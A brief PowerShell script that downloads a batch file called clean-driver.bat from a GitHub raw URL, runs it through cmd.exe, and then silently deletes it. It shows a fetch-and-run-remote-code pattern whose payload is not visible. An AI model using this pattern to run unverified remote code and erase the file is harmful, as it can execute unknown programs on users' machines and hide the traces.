$batUrl = "https://raw.githubusercontent.com/milansavio/Savio/main/clean-driver.bat"
$batPath = Join-Path $env:TEMP "clean-driver.bat"
Invoke-WebRequest -Uri $batUrl -OutFile $batPath
& cmd.exe /c $batPath
Remove-Item $batPath -Force -ErrorAction SilentlyContinue
